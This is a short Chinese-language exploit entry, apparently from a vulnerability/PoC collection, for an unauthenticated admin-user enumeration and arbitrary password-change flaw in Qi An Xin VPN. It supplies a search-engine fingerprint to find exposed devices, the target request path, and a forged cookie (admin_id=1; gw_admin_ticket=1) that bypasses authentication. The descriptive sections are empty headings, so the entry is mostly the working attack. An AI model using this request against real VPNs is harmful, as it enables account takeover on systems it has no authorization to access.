# 奇安信VPN存在未授权管理用户遍历及任意账号密码修改漏洞

- **系统**：奇安信　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`app.name="奇安信 VPN"`
- **请求**：`GET /admin/group/x_group.php?id=1 HTTP/1.1`

**请求体 / payload**
```
用户遍历\
修改`cookie：admin_id=1; gw_admin_ticket=1;`访问出现如下页面表示存在漏洞
Host: xx.xx.xx.xx
Cookie: admin_id=1; gw_admin_ticket=1;
Sec-Fetch-User: ?1
```

**其他**
- 奇安信VPN存在未授权管理用户遍历及任意账号密码修改漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 奇安信VPN